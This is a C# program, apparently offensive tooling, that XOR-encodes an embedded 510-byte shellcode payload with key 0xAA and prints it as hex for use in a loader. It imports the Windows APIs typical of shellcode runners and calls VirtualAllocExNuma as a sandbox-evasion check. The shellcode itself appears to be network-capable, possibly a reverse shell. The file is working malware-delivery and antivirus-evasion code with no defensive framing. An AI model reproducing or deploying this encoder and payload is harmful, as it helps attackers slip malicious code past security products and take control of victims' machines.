﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32.SafeHandles;

namespace XOR_encoder
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress , IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

       


        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            if (mem == null) {
                return;
            }


            byte[] buf = new byte[510] {
0xeb,0x27,0x5b,0x53,0x5f,0xb0,0xa4,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0x2f,0xf9,
0x74,0x07,0x80,0x3e,0xa4,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
0xff,0x1b,0xa4,0xe7,0x53,0x98,0xff,0xeb,0xf3,0xdb,0x1b,0x1b,0x1b,0x5a,0x4a,
0x5a,0x4b,0x49,0x4a,0x4d,0x53,0x2a,0xc9,0x7e,0x53,0x90,0x49,0x7b,0x53,0x90,
0x49,0x03,0x53,0x90,0x49,0x3b,0x53,0x90,0x69,0x4b,0x53,0x14,0xac,0x51,0x51,
0x56,0x2a,0xd2,0x53,0x2a,0xdb,0xb7,0x27,0x7a,0x67,0x19,0x37,0x3b,0x5a,0xda,
0xd2,0x16,0x5a,0x1a,0xda,0xf9,0xf6,0x49,0x5a,0x4a,0x53,0x90,0x49,0x3b,0x90,
0x59,0x27,0x53,0x1a,0xcb,0x90,0x9b,0x93,0x1b,0x1b,0x1b,0x53,0x9e,0xdb,0x6f,
0x7c,0x53,0x1a,0xcb,0x4b,0x90,0x53,0x03,0x5f,0x90,0x5b,0x3b,0x52,0x1a,0xcb,
0xf8,0x4d,0x53,0xe4,0xd2,0x5a,0x90,0x2f,0x93,0x53,0x1a,0xcd,0x56,0x2a,0xd2,
0x53,0x2a,0xdb,0xb7,0x5a,0xda,0xd2,0x16,0x5a,0x1a,0xda,0x23,0xfb,0x6e,0xea,
0x57,0x18,0x57,0x3f,0x13,0x5e,0x22,0xca,0x6e,0xc3,0x43,0x5f,0x90,0x5b,0x3f,
0x52,0x1a,0xcb,0x7d,0x5a,0x90,0x17,0x53,0x5f,0x90,0x5b,0x07,0x52,0x1a,0xcb,
0x5a,0x90,0x1f,0x93,0x53,0x1a,0xcb,0x5a,0x43,0x5a,0x43,0x45,0x42,0x41,0x5a,
0x43,0x5a,0x42,0x5a,0x41,0x53,0x98,0xf7,0x3b,0x5a,0x49,0xe4,0xfb,0x43,0x5a,
0x42,0x41,0x53,0x90,0x09,0xf2,0x4c,0xe4,0xe4,0xe4,0x46,0x52,0xa5,0x6c,0x68,
0x29,0x44,0x28,0x29,0x1b,0x1b,0x5a,0x4d,0x52,0x92,0xfd,0x53,0x9a,0xf7,0xbb,
0x1a,0x1b,0x1b,0x52,0x92,0xfe,0x52,0xa7,0x19,0x1b,0x1b,0x4b,0x2f,0x59,0x0f,
0x29,0x5a,0x4f,0x52,0x92,0xff,0x57,0x92,0xea,0x5a,0xa1,0x57,0x6c,0x3d,0x1c,
0xe4,0xce,0x57,0x92,0xf1,0x73,0x1a,0x1a,0x1b,0x1b,0x42,0x5a,0xa1,0x32,0x9b,
0x70,0x1b,0xe4,0xce,0x4b,0x4b,0x56,0x2a,0xd2,0x56,0x2a,0xdb,0x53,0xe4,0xdb,
0x53,0x92,0xd9,0x53,0xe4,0xdb,0x53,0x92,0xda,0x5a,0xa1,0xf1,0x14,0xc4,0xfb,
0xe4,0xce,0x53,0x92,0xdc,0x71,0x0b,0x5a,0x43,0x57,0x92,0xf9,0x53,0x92,0xe2,
0x5a,0xa1,0x82,0xbe,0x6f,0x7a,0xe4,0xce,0x53,0x9a,0xdf,0x5b,0x19,0x1b,0x1b,
0x52,0xa3,0x78,0x76,0x7f,0x1b,0x1b,0x1b,0x1b,0x1b,0x5a,0x4b,0x5a,0x4b,0x53,
0x92,0xf9,0x4c,0x4c,0x4c,0x56,0x2a,0xdb,0x71,0x16,0x42,0x5a,0x4b,0xf9,0xe7,
0x7d,0xdc,0x5f,0x3f,0x4f,0x1a,0x1a,0x53,0x96,0x5f,0x3f,0x03,0xdd,0x1b,0x73,
0x53,0x92,0xfd,0x4d,0x4b,0x5a,0x4b,0x5a,0x4b,0x5a,0x4b,0x52,0xe4,0xdb,0x5a,
0x4b,0x52,0xe4,0xd3,0x56,0x92,0xda,0x57,0x92,0xda,0x5a,0xa1,0x62,0xd7,0x24,
0x9d,0xe4,0xce,0x53,0x2a,0xc9,0x53,0xe4,0xd1,0x90,0x15,0x5a,0xa1,0x13,0x9c,
0x06,0x7b,0xe4,0xce,0xa0,0xeb,0xae,0xb9,0x4d,0x5a,0xa1,0xbd,0x8e,0xa6,0x86,
0xe4,0xce,0x53,0x98,0xdf,0x33,0x27,0x1d,0x67,0x11,0x9b,0xe0,0xfb,0x6e,0x1e,
0xa0,0x5c,0x08,0x69,0x74,0x71,0x1b,0x42,0x5a,0x92,0xc1,0xe4,0xce,0x2f,0xf9 };

            byte[] encoded = new byte[buf.Length];
            for (int i=0; i < buf.Length;i++) {
                encoded[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded) {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("The payload is: " + hex.ToString());

        }
    }
}
